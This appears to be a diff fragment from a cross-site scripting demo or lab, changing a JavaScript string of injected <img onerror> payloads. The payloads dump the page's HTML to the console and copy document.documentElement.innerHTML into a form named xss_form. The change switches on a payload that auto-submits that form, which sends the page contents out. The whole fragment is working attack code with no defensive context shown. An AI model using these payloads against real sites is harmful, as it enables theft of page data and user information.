@@ -8,8 +8,8 @@ function changeTitle(){
             <img src="x" onerror="console.log(document.documentElement.innerHTML)">\
             <img src="x" onerror="console.log(document.document.body.innerHTML)">\
             <img src="x" onerror="console.log(document.document.body.innertext)">\
-            <img src="x" onerror="document.forms.xss_form.elements.info.value = document.documentElement.innerHTML">';
-            // <img src="x" onerror="document.forms.xss_form.submit()">';
+            <img src="x" onerror="document.forms.xss_form.elements.info.value = document.documentElement.innerHTML">\
+            <img src="x" onerror="document.forms.xss_form.submit()">';
             
     }, 100);
     
